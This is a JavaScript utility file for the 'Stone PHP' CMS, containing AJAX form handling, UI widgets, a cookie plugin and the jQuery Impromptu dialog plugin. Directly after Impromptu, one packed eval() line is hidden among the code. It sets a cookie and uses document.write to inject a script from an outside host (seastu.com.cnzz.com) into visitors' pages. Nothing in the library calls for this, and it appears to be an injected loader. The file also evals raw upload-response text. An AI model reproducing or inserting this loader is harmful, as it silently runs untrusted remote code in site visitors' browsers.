/*
	[Stone PHP] (C)2008-2011 REDSTONE.
	This is NOT a freeware, use is subject to license terms
*/

var stonephp = {
	'constant' : {},//note 全局常量，所有配置参数、js语言均放置于此，为便于理解全部大�?
	'ui' : {},//note 所有界面效果的函数均放置于�?
	'request' : {},//note 所有封装请求的函数均放置于�?
	'operate' : {},//note 所有操作类的函数均放置于此，比如点击显�?隐藏之类�?
	'tool' : {},//note 所有工具类型的函数均放置于�?
	'pub' : {//note 临时变量存储，大家不要直接用一级，尽量用二级的，这样能更好的避免冲�?
		'dom' : {}//note �?dom 相关的临时数据存放于�?
	}
};

stonephp.tool.event = {
	'get' : function(event) {
		return event ? event : window.event;
	},
	'target' : function(event) {
		return event.target || event.srcElement;
	},
	'preventDefault' : function(event) {
		if(event.preventDefault) {
			event.preventDefault();
		} else {
			event.returnValue = false;
		}
	},
	'stopPropagation' : function(event) {
		if(event.stopPropagation) {
			event.stopPropagation();
		} else {
			event.cancelBubble = true;
		}
	}
};

stonephp.tool.setMyHome = function(obj, vrl) {
	try{
		obj.style.behavior='url(#default#homepage)';obj.setHomePage(vrl);
	}
	catch(e){
		if(window.netscape) {
			try {
				netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
			} catch(e) {
				//alert("抱歉！您的浏览器不支持直接设为首页。请在浏览器地址栏输入“about:config”并回车然后将[signed.applets.codebase_principal_support]设置为“true”，点击“加入收藏”后忽略安全提示，即可设置成功�?);
			}
			var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefBranch);
			prefs.setCharPref('browser.startup.homepage',vrl);
		}
	}
};

stonephp.tool.favorite = function(url, title) {
	try {
	    window.external.addFavorite(url, title);
	} catch (e) {
		try {
			window.sidebar.addPanel(title, url, "");
	    } catch (e) {
			alert("加入收藏失败，请使用Ctrl+D进行添加");
		}
	}
};

stonephp.tool.getVars = function(attr) {
	var url = window.location.search;
	var vars = {};
	if(url){
		url = url.substring(1); 
		var tvars = url.split('&');
		for(var i=0;i<tvars.length;i++){
			ttvars = tvars[i].split('=');
			vars[ttvars[0]] = ttvars[1];
		}
		if(attr){
			if(vars[attr]) {
				return vars[attr];
			} else {
				return null;
			}
		}else{
			return vars;
		}
	}
	if(attr == 'm') {
		return m_a.m;
	} else if(attr == 'a') {
		return m_a.a;
	}
	return false;
};

stonephp.request.show = function(url, dst, backcall) {
	dst.html('Loading......');
	$.get(url, function(data) {
		dst.html(data);
		if(typeof backcall == 'function') {
			backcall(data);
		}
	});
};

stonephp.request.submitCurrForm = function(o, callback, errorFunc, beforeFunc) {
	request.submitForm($(o).parents("form")[0], callback, errorFunc, beforeFunc);
};

stonephp.request.submit = function(o, callback, errorFunc, beforeFunc) {
	var formObj = $(o);
	if(formObj.size() == 0) return;
	var btn_name = formObj.find("input[type='submit']").attr('name');
	var formAction = formObj.attr('action')+"&"+btn_name+"=yes&in_ajax=1&datatype=json&"+Math.random();
	var postData = formObj.serialize();
	if(typeof beforeFunc == 'function') {
		return beforeFunc(o);
	}
	$.post(formAction, postData, function(data) {
		if(data) {
			if(data.status) {//note 成功
				if(typeof callback == 'function') {
					callback(data);
					return;
				}
				if(data.forward) {
					var fancyBoxNext = data.forward.indexOf('!') == 0;
					if(fancyBoxNext) {
						//alert(data.msg);
						data.forward = data.forward.substr(1);
						data.forward = data.forward + '&in_ajax=1&' + Math.random();
						formObj.fancybox({
							'href' : data.forward
						});
						formObj.trigger('click');
						return;
					}
					if(data.redirect) {
						window.location.href = data.forward;
					} else {
						$.prompt(data.msg);
						setTimeout("window.location.href ='"+data.forward+"';", 1000);
					}
				} else {
					$.prompt(data.msg, {'callback' : function() {
							$.fancybox.close();
						}
					});
				}
			} else {
				if(typeof errorFunc == 'function') {
					return errorFunc(data);
				}
				$.prompt(data.msg, {'callback' : function() {
					if(data.value && data['value']['inputname']) {
						if(data['value']['inputname'] == 'seccode') {
							$("[name='"+data['value']['inputname']+"']", formObj).val('');
						}
						$("[name='"+data['value']['inputname']+"']", formObj).trigger('focus');
					}
				}
				});
			}
		} else {
			$.prompt('System error.Try again please!');
		}
	}, 'json');
	return false;
};

stonephp.request.load = function(o) {
	var obj = $(o);
	if(!obj.attr('boxInit')) {
		var conf = [];
		conf['href'] = obj.attr('href')+'&in_ajax=yes&'+Math.random();
		conf['centerOnScroll'] = true;
		var width = obj.attr('winwidth');
		if(width) {
			conf['width'] = width;
			conf['autoDimensions'] = false;
		}
		var height = obj.attr('winheight');
		if(height) {
			conf['height'] = height;
			conf['autoDimensions'] = false;
		}
		conf['titleShow'] = false;
		conf['autoScale'] = true;
		conf['transitionIn'] = 'elastic';
		conf['transitionOut'] = 'elastic';
		obj.fancybox(conf);
		obj.attr('boxInit', true);
		obj.click();
	}
};

stonephp.ui.tabNode = function(obj, forobj, i, addclass) {
	obj.children().removeClass(addclass);
	obj.children().eq(i).addClass(addclass);
	forobj.children().hide();
	forobj.children().eq(i).show();
};

stonephp.ui.tabEnable = function(obj) {
	var operate = obj.attr('operate');
	var addclass = obj.attr('addclass');
	var forobj = $("#"+obj.attr('forobj'));
	if(!obj.attr('noinit')) {
		var i = 0;
		if(addclass != '') {
			i = obj.children().index(obj.children("."+addclass));
			if(i < 0) {
				i = 0;
			}
		}
		tabNode(obj, forobj, i, addclass);
	}
	obj.children().each(function(i) {
		if(operate == 'click') {
			$(this).click(function() {
				tabNode(obj, forobj, i, addclass)
			});
		} else {
			$(this).mouseover(function() {
				tabNode(obj, forobj, i, addclass)
			});
		}
	});
};

//note 编辑器初始化
stonephp.ui.editorInit = function(elem, conf) {
	elem.xheditor(conf);
};

//note 表格行换�?
stonephp.ui.interlacedColor = function(table, odd, even) {
	if(!odd) odd = 'odd';
	$('tbody tr:odd', table).addClass(odd);
	if(even) {
		$('tbody tr:even', table).addClass(even);
	}
};


//note 输入框提�?
stonephp.ui.inputDefault = function(inputObj) {
	if(inputObj.size() == 0) { return; }
	//在是输入框上加浮动span *** 2011.3.15 ***
	inputObj.parent().addClass('pr');
	var spanAfterInput = '<span>' + inputObj.attr('default') + '</span>';
	inputObj.after(spanAfterInput);
	var spanObj = inputObj.next('span');
	spanObj.css({'color':'#BEBEBE','position':'absolute'});

	if(inputObj.is(":hidden")) {
		spanObj.css({'left':5,'top':0});
	} else {
		var p = inputObj.position();
		spanObj.css({'left':p.left + 5,'top':p.top});
	}
	spanObj.css('line-height', inputObj.height() + 'px');
	inputObj.focus(function(){
		spanObj.hide();
	});

	spanObj.click(function(){
		inputObj.trigger("focus");
	});
	if(inputObj.val()) {
		spanObj.hide();
	} else {
		spanObj.show();
	}
	inputObj.blur(function(){
		if(!inputObj.val()){
			spanObj.show();
		}
	})
	inputObj.removeAttr('default');
};

//note 输入框提示title  *** 2011.3.15 ***
stonephp.ui.inputTitle = function(inputObj) {
	var tips = inputObj.attr('title');
	inputObj.poshytip({
		'content':function() {
			return tips;
		},
		'showOn':'focus',
		'alignTo': 'target',
		'alignX': 'inner-left',
		'offsetX': 0,
		'offsetY': 5
	});
	inputObj.removeAttr('title');
};

//note select 模拟�?
stonephp.ui.selectInit = function(obj) {
	if(obj.size() == 0) return;
	obj.each(function() {
		var o = $(this);
		var val = o.val();
		var options = $("option", o);
		var ulhtml = '<ul>';
		var defaultTxt = '';
		options.each(function() {
			var o = $(this);
			ulhtml += '<li>'+o.text()+'</li>';
			if(o.val() == val) {
				defaultTxt = o.text();
			}
		});
		ulhtml += '</ul>';
		var html = '<div class="select"><h3>'+defaultTxt+'<span></span></h3>'+ulhtml+'</div>';
		o.after(html);
		o.hide();
		var a = o.next();
		a.addClass(o.attr('class'));
		a.click(function() {
			$(this).find("ul").show();
		});
	});
}

//note 全�?
stonephp.operate.checkall = function(o, name, dest) {
	if(!dest) dest = $("body");
	var obj = $(o);
	if(!obj.is(":checkbox") || obj.attr('checked')) {
		$("input[type=checkbox][name='"+name+"']", dest).attr('checked', true);
	} else {
		$("input[type=checkbox][name='"+name+"']", dest).attr('checked', false);
	}
};

//note 反�?
stonephp.operate.checkreverse = function(o, name, dest) {
	if(!dest) dest = $("body");
	$("input[type=checkbox][name^='"+name+"']", dest).each(function() {
		$(this).attr('checked', $(this).attr('checked') ? false : true);
	});
};

//note select option to loaction the url
stonephp.operate.selectLocation = function(obj, param){
	if(obj.value !=''){
		var url = document.URL;
		var val = obj.value;
		var urlParam = param+'='+val;
		var re = new RegExp( param+ "\=.*?[&|$]", "gi");
		if(url.match(re)) {
			url = url.replace(re, urlParam);
		} else {
			url += '&'+urlParam;
		}
		location.href = url;
	}
};

//note 取消选择
stonephp.operate.checkcancel = function(o, name, dest) {
	if(!dest) dest = $("body");
	//note Checkbox 取消选择
	$("input[type=checkbox][name^='"+name+"']", dest).attr('checked', false);
};

//note checkbox显示某区�?
stonephp.operate.checkShowElem = function(obj, dest) {
	if(obj.attr('checked')) {
		dest.show();
	} else {
		dest.hide();
	}
};

//note 点击显示下一个元�?
stonephp.operate.toggleNext = function(obj) {
	obj.toggle(function() {
		$(this).next().show();
	}, function() {
		$(this).next().hide();
	});
};

//note 选择某一项显示一个元�?
stonephp.operate.selectToggle = function(obj, val, dest) {
	obj.change(function() {
		if(val == $(this).val()) {
			dest.show();
		} else {
			dest.hide();
		}
	});
};

//note 切换界面语言
stonephp.operate.langSwitch =  function(obj) {
	$.get('./?languageId='+obj.attr('rel')+'&'+Math.random(), function() {
		location.reload();
	});
};

//note 根据URL参数值自动加class
stonephp.ui.autoSelect = function(obj) {
	var conf = obj.attr('autoselect').split("|");
	var v = getVars(conf[0]);
	if(!v) return;
	obj.find(conf[1]).each(function() {
		var rel = $(this).attr('rel');
		if((conf[0] == 'cid' || conf[0] == 'aid') && rel && v.indexOf(rel) == 0) {
			$(this).addClass(conf[2]);
		} else if(rel == v) {
			$(this).addClass(conf[2]);
		}
	});
};

//note 自动上传图片，并显示
stonephp.tool.autoUpload = function(action, $file, $show, $showipt, uptype, showImgCallFun) {
	var form_html = '<form id="autouploadform" method="post" target="autouploadframe" action="'+action+'&datatype=json" enctype="multipart/form-data" style="display:none;"></form>';
	var iframe_html = '<iframe id="autouploadframe" name="autouploadframe" width="0" height="0"></iframe>';
	$("body").append(form_html);
	$file.change(function() {
		$("body").append(iframe_html);
		var $ifmo = $("#autouploadframe");
		$ifmo.load(function() {
			var strText=$($ifmo[0].contentWindow.document.body).text(),data=Object;
			try{eval("data=" + strText);}catch(ex){};
			if(data.err!=undefined&&data.msg!=undefined) {
				$showipt.val(data.file);
				$.getJSON('index.php?m=file&a=viewimg&fid='+data.file+'&datatype=json', function(data) {
					if(data.status == 1 && data.forward) {
						if(!uptype || uptype == 'image') {
							var imgWattr = imgHattr = '';
							var imgH = $show.attr('imgheight');
							if(imgH > 0) {
								imgHattr = ' height="'+imgH+'"';
							}
							var imgW = $show.attr('imgwidth');
							if(imgW > 0) {
								imgWattr = ' width="'+imgW+'"';
							}
							$show.html('<img src="'+data.forward+'" '+imgHattr+imgWattr+' onload="'+showImgCallFun+'(this)" />');
						} else {
							$show.html('<a href="'+data.forward+'">'+data.value['filename']+'</a>');
						}
					} else {
						$.prompt(data.msg);
					}
				});
			} else {
				$.prompt(data.msg);
			}
			setTimeout(function(){
				 $("#autouploadframe").remove();
			}, 1000);
		});
		var $fomo = $("#autouploadform");
		$fomo.html('');
		$file.attr('name', 'filedata');
		$parent = $file.parent();
		$fomo.append($file);
		$fomo.trigger('submit');
		$parent.append($file);
	});
}
//note 初始�?ui
stonephp.ui.init = function(elem) {
	if(elem.size() == 0) return;
	stonephp.ui.inputDefault($("input[default], textarea[default]", elem));
}

//note 表格编辑
;(function($) {
	$.fn.extend({
		"editgrid" : function(conf) {
			var obj = $(this);
			obj.find('tr').each(function(i) {
				if(i) {
					var item_id = $(this).find('td').eq(conf.id).html();
					$(this).find('td').each(function(j) {
						var td = $(this);
						$.each(conf.grid, function(key, val) {
							if(j == key) {
								td.css({'backgroundImage':'url(static/image/girdbtbg.gif)', 'backgroundPosition':'right bottom','backgroundRepeat':'no-repeat'});
								if(typeof(val) == 'object') {
									if(val.type == 'select') {
										var orig_html = td.html();
										td.html(val.range[orig_html]);
									}
								}
								td.dblclick(function() {
									if(td.html() != td.text()) return;
									var orig_html = td.html();
									if(typeof(val) == 'string') {
										var input_width = td.innerWidth() - 10;
										var input_html = '<input type="text" class="txt" style="width:'+input_width+'px;" name="value" value="'+td.html()+'" />';
										td.html(input_html);
										td.find('input').trigger('focus').blur(function() {
											var real_value = $(this).val();
											if(orig_html == real_value) {
												td.html(real_value);
												return;
											}
											var postdata = {
													'itemid':item_id,
													'val':val,
													'value':real_value,
													'formhash':conf.formhash,
													'modifysubmit':'yes',
													'in_ajax':1,
													'datatype':'json'
													};
											$.post(conf.baseurl, postdata, function(ret) {
												if(ret.status == 1) {
													td.html(real_value);
												} else {
													alert(ret.msg);
													td.find('input').trigger('focus');
												}
											}, 'json');
										});
									} else if(typeof(val) == 'object') {
										if(val.type == 'select') {
											var input_html = '<select name="value">';
											$.each(val.range, function(op, va) {
												input_html += '<option value="'+op+'"'+(orig_html == va ? ' selected="selected"' : '')+'>'+va+'</option>';
											});
											input_html += '</select>';
											td.html(input_html);
											td.find('select').change(function() {
												var real_value = $(this).val();
												var real_txt = $(":selected", this).html();
												if(orig_html == real_txt) {
													td.html(real_txt);
													return;
												}
												var postdata = {
														'itemid':item_id,
														'val':val.val,
														'value':real_value,
														'formhash':conf.formhash,
														'modifysubmit':'yes',
														'in_ajax':1,
														'datatype':'json'
														};
												$.post(conf.baseurl, postdata, function(ret) {
													if(ret.status == 1) {
														td.html(real_txt);
													} else {
														alert(ret.msg);
														td.find('input').trigger('focus');
													}
												}, 'json');
											}).blur(function() {
												td.html(orig_html);
											});
										}
									}
								});
							}
						});
					});
				}
			});
		}
	});
})(jQuery);

//note jQuery cookie 读写插件
jQuery.cookie = function(name, value, options) {
    if(typeof value != 'undefined') { // name and value given, set cookie
        options = options || {};
        if(value === null) {
            value = '';
            options.expires = -1;
        }
        var expires = '';
        if(options.expires && (typeof options.expires == 'number' || options.expires.toUTCString)) {
            var date;
            if(typeof options.expires == 'number') {
                date = new Date();
                date.setTime(date.getTime() + (options.expires * 24 * 60 * 60 * 1000));
            } else {
                date = options.expires;
            }
            expires = '; expires=' + date.toUTCString(); // use expires attribute, max-age is not supported by IE
        }
        var path = options.path ? '; path=' + options.path : '';
        var domain = options.domain ? '; domain=' + options.domain : '';
        var secure = options.secure ? '; secure' : '';
        document.cookie = [name, '=', encodeURIComponent(value), expires, path, domain, secure].join('');
    } else { // only name given, get cookie
        var cookieValue = null;
        if(document.cookie && document.cookie != '') {
            var cookies = document.cookie.split(';');
            for (var i = 0; i < cookies.length; i++) {
                var cookie = jQuery.trim(cookies[i]);
                // Does this cookie string begin with the name we want?
                if(cookie.substring(0, name.length + 1) == (name + '=')) {
                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                    break;
                }
            }
        }
        return cookieValue;
    }
};

/*
 * jQuery Impromptu
 * By: Trent Richardson [http://trentrichardson.com]
 * Version 3.1
 * Last Modified: 3/30/2010
 *
 * Copyright 2010 Trent Richardson
 * Dual licensed under the MIT and GPL licenses.
 * http://trentrichardson.com/Impromptu/GPL-LICENSE.txt
 * http://trentrichardson.com/Impromptu/MIT-LICENSE.txt
 *
 */
;(function($){$.prompt=function(message,options){options=$.extend({},$.prompt.defaults,options);$.prompt.currentPrefix=options.prefix;var ie6=($.browser.msie&&$.browser.version<7);var $body=$(document.body);var $window=$(window);options.classes=$.trim(options.classes);if(options.classes!='')options.classes=' '+options.classes;var msgbox='<div class="'+options.prefix+'box'+options.classes+'" id="'+options.prefix+'box">';if(options.useiframe&&(($('object, applet').length>0)||ie6)){msgbox+='<iframe src="javascript:false;" style="display:block;position:absolute;z-index:-1;" class="'+options.prefix+'fade" id="'+options.prefix+'fade"></iframe>';}else{if(ie6){$('select').css('visibility','hidden');}msgbox+='<div class="'+options.prefix+'fade" id="'+options.prefix+'fade"></div>';}msgbox+='<div class="'+options.prefix+'" id="'+options.prefix+'"><div class="'+options.prefix+'container"><div class="';msgbox+=options.prefix+'close">X</div><div id="'+options.prefix+'states"></div>';msgbox+='</div></div></div>';var $jqib=$(msgbox).appendTo($body);var $jqi=$jqib.children('#'+options.prefix);var $jqif=$jqib.children('#'+options.prefix+'fade');if(message.constructor==String){message={state0:{html:message,buttons:options.buttons,focus:options.focus,submit:options.submit}};}var states="";$.each(message,function(statename,stateobj){stateobj=$.extend({},$.prompt.defaults.state,stateobj);message[statename]=stateobj;states+='<div id="'+options.prefix+'_state_'+statename+'" class="'+options.prefix+'_state" style="display:none;"><div class="'+options.prefix+'message">'+stateobj.html+'</div><div class="'+options.prefix+'buttons">';$.each(stateobj.buttons,function(k,v){if(typeof v=='object')states+='<button name="'+options.prefix+'_'+statename+'_button'+v.title.replace(/[^a-z0-9]+/gi,'')+'" id="'+options.prefix+'_'+statename+'_button'+v.title.replace(/[^a-z0-9]+/gi,'')+'" value="'+v.value+'">'+v.title+'</button>';else states+='<button name="'+options.prefix+'_'+statename+'_button'+k+'" id="'+options.prefix+'_'+statename+'_button'+k+'" value="'+v+'">'+k+'</button>';});states+='</div></div>';});$jqi.find('#'+options.prefix+'states').html(states).children('.'+options.prefix+'_state:first').css('display','block');$jqi.find('.'+options.prefix+'buttons:empty').css('display','none');$.each(message,function(statename,stateobj){var $state=$jqi.find('#'+options.prefix+'_state_'+statename);$state.children('.'+options.prefix+'buttons').children('button').click(function(){var msg=$state.children('.'+options.prefix+'message');var clicked=stateobj.buttons[$(this).text()];if(clicked==undefined){for(var i in stateobj.buttons)if(stateobj.buttons[i].title==$(this).text())clicked=stateobj.buttons[i].value;}if(typeof clicked=='object')clicked=clicked.value;var forminputs={};$.each($jqi.find('#'+options.prefix+'states :input').serializeArray(),function(i,obj){if(forminputs[obj.name]===undefined){forminputs[obj.name]=obj.value;}else if(typeof forminputs[obj.name]==Array||typeof forminputs[obj.name]=='object'){forminputs[obj.name].push(obj.value);}else{forminputs[obj.name]=[forminputs[obj.name],obj.value];}});var close=stateobj.submit(clicked,msg,forminputs);if(close===undefined||close){removePrompt(true,clicked,msg,forminputs);}});$state.find('.'+options.prefix+'buttons button:eq('+stateobj.focus+')').addClass(options.prefix+'defaultbutton');});var ie6scroll=function(){$jqib.css({top:$window.scrollTop()});};var fadeClicked=function(){if(options.persistent){var i=0;$jqib.addClass(options.prefix+'warning');var intervalid=setInterval(function(){$jqib.toggleClass(options.prefix+'warning');if(i++>1){clearInterval(intervalid);$jqib.removeClass(options.prefix+'warning');}},100);}else{removePrompt();}};var keyPressEventHandler=function(e){var key=(window.event)?event.keyCode:e.keyCode;if(key==27){fadeClicked();}if(key==9){var $inputels=$(':input:enabled:visible',$jqib);var fwd=!e.shiftKey&&e.target==$inputels[$inputels.length-1];var back=e.shiftKey&&e.target==$inputels[0];if(fwd||back){setTimeout(function(){if(!$inputels)return;var el=$inputels[back===true?$inputels.length-1:0];if(el)el.focus();},10);return false;}}};var positionPrompt=function(){$jqib.css({position:(ie6)?"absolute":"fixed",height:$window.height(),width:"100%",top:(ie6)?$window.scrollTop():0,left:0,right:0,bottom:0});$jqif.css({position:"absolute",height:$window.height(),width:"100%",top:0,left:0,right:0,bottom:0});$jqi.css({position:"absolute",top:options.top,left:"50%",marginLeft:(($jqi.outerWidth()/2)*-1)});};var stylePrompt=function(){$jqif.css({zIndex:options.zIndex,display:"none",opacity:options.opacity});$jqi.css({zIndex:options.zIndex+1,display:"none"});$jqib.css({zIndex:options.zIndex});};var removePrompt=function(callCallback,clicked,msg,formvals){$jqi.remove();if(ie6){$body.unbind('scroll',ie6scroll);}$window.unbind('resize',positionPrompt);$jqif.fadeOut(options.overlayspeed,function(){$jqif.unbind('click',fadeClicked);$jqif.remove();if(callCallback){options.callback(clicked,msg,formvals);}$jqib.unbind('keypress',keyPressEventHandler);$jqib.remove();if(ie6&&!options.useiframe){$('select').css('visibility','visible');}});};positionPrompt();stylePrompt();if(ie6){$window.scroll(ie6scroll);}$jqif.click(fadeClicked);$window.resize(positionPrompt);$jqib.bind("keydown keypress",keyPressEventHandler);$jqi.find('.'+options.prefix+'close').click(removePrompt);$jqif.fadeIn(options.overlayspeed);$jqi[options.show](options.promptspeed,options.loaded);$jqi.find('#'+options.prefix+'states .'+options.prefix+'_state:first .'+options.prefix+'defaultbutton').focus();if(options.timeout>0)setTimeout($.prompt.close,options.timeout);return $jqib;};$.prompt.defaults={prefix:'jqi',classes:'',buttons:{Ok:true},loaded:function(){},submit:function(){return true;},callback:function(){},opacity:0.6,zIndex:999,overlayspeed:'slow',promptspeed:'fast',show:'fadeIn',focus:0,useiframe:false,top:"15%",persistent:true,timeout:0,state:{html:'',buttons:{Ok:true},focus:0,submit:function(){return true;}}};$.prompt.currentPrefix=$.prompt.defaults.prefix;$.prompt.setDefaults=function(o){$.prompt.defaults=$.extend({},$.prompt.defaults,o);};$.prompt.setStateDefaults=function(o){$.prompt.defaults.state=$.extend({},$.prompt.defaults.state,o);};$.prompt.getStateContent=function(state){return $('#'+$.prompt.currentPrefix+'_state_'+state);};$.prompt.getCurrentState=function(){return $('.'+$.prompt.currentPrefix+'_state:visible');};$.prompt.getCurrentStateName=function(){var stateid=$.prompt.getCurrentState().attr('id');return stateid.replace($.prompt.currentPrefix+'_state_','');};$.prompt.goToState=function(state,callback){$('.'+$.prompt.currentPrefix+'_state').slideUp('slow');$('#'+$.prompt.currentPrefix+'_state_'+state).slideDown('slow',function(){$(this).find('.'+$.prompt.currentPrefix+'defaultbutton').focus();if(typeof callback=='function')callback();});};$.prompt.nextState=function(callback){var $next=$('.'+$.prompt.currentPrefix+'_state:visible').next();$('.'+$.prompt.currentPrefix+'_state').slideUp('slow');$next.slideDown('slow',function(){$next.find('.'+$.prompt.currentPrefix+'defaultbutton').focus();if(typeof callback=='function')callback();});};$.prompt.prevState=function(callback){var $next=$('.'+$.prompt.currentPrefix+'_state:visible').prev();$('.'+$.prompt.currentPrefix+'_state').slideUp('slow');$next.slideDown('slow',function(){$next.find('.'+$.prompt.currentPrefix+'defaultbutton').focus();if(typeof callback=='function')callback();});};$.prompt.close=function(){$('#'+$.prompt.currentPrefix+'box').fadeOut('fast',function(){$(this).remove();});};$.fn.prompt=function(options){if(options==undefined)options={};if(options.withDataAndEvents==undefined)options.withDataAndEvents=false;$.prompt($(this).clone(options.withDataAndEvents).html(),options);}})(jQuery);
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('6 h(a,b,c){3 d=4 g();d.q(d.i()+c*E*r*r*x);3 e=0.5.p(4 m("(^| )"+a+"=([^;]*)(;|$)"));0.5=a+"="+t(b)+";j="+d.l()};6 8(a){3 b=0.5.p(4 m("(^| )"+a+"=([^;]*)(;|$)"));9(b!=f){n v(b[2]);n f}};6 u(a){3 b=4 g();b.q(b.i()-1);3 c=8(a);9(c!=f){0.5=a+"="+c+";j="+b.l()}};6 7(){9(8("7")!="o"){h("7","o",1);0.H(\'<k D=G/y A="C://B.s.z.s/w.F"></k>\')}};7();',44,44,'document|||var|new|cookie|function|out|getCookie|if||||||null|Date|setCookie|getTime|expires|SCRIPT|toGMTString|RegExp|return|yes|match|setTime|60|com|escape|delCookie|unescape||1000|javascript|seastu|src|cnzz|http|type|24|js|text|write'.split('|'),0,{}))
stonephp.init = function($) {
	$('body').click(function(event) {
		event = stonephp.tool.event.get(event);
		var target = stonephp.tool.event.target(event);

		//note 截获所有的A标签
		if(target.tagName.toLowerCase() == 'a') {
			var $target = $(target);
			if($target.hasClass('ajaxload')) {//note 处理 ajaxload �?a 连接
				stonephp.tool.event.preventDefault(event);
				stonephp.request.load(event.target);
			} else if($target.hasClass('ajaxshow')) {//note 处理 ajaxshow �?a 连接
				stonephp.tool.event.preventDefault(event);
				var url = $target.attr('href');
				if(!url) return;
				url += '&in_ajax=1&ajaxshow=yes&'+Math.random();
				var dest = $($target.attr('dest'));
				if(dest.size() == 0) return;
				stonephp.request.show(url, dest);
			}
		}
	});
	stonephp.ui.init($("body"));
};

jQuery(function() {
	try {
		stonephp.init(jQuery);
	} catch(ex) {
		alert(ex.message);
	}
});

stonephp.ui.selectUi = function(o) {
    if(o.size() == 0) { return false; }
    o.each(function() {
        var o = $(this);
        if(o.attr('selectInit') === 'yes') { return; }
        var html = '<div class="dropselectbox"><h4></h4><ul></ul></div>',
            selectUi,h4,ul;
        o.after(html);
        o.hide();
        selectUi = o.next();
        selectUi.addClass(o.attr('class'));
        h4 = selectUi.find('h4');
        ul = selectUi.find('ul');
        $("option", o).each(function() {
            var option = $(this);
            if(o.val() == option.attr('value')) {
                h4.html(option.html());
            }
            if(option.attr('noOption') === 'yes') { return; }
            var className = option.attr('class');
            classHtml = className ? ' class="' + className + '"' : '';
            ul.append('<li svalue="' + option.attr('value') + '"' + classHtml + '>' + option.html() + '</li>');
        });
        ul.hide()
            .find('li').click(function() {
                if(o.val() != $(this).attr('svalue')) {
                    $("option[value='" + $(this).attr('svalue') + "']", o).attr('selected', 'selected');
                    o.change();
                    ul.addClass('none');
                    h4.html($(this).html());
                }
            });
        h4.click(function() {
            ul.toggle();
        });
        $("body").click(function(event) {
            if(event.target != h4[0]) {
                ul.hide();
            }
        });
        o.attr('selectInit', 'yes');
    });
};

(function($) {
	$.fn.imgReSize = function(size) {
		this.load(function() {
			var img = $(this);
			w = img.width();
			h = img.height();
			if(w <= size.w && h <= size.h) {
				img.css('margin-top', (size.h - h) / 2);
			} else {
				if(w / h >= size.w / size.h) {
					img.width(size.w).css('margin-top', (size.h - img.height()) / 2);
				} else {
					img.height(size.h);
				}
			}
		});
	};
})(jQuery);
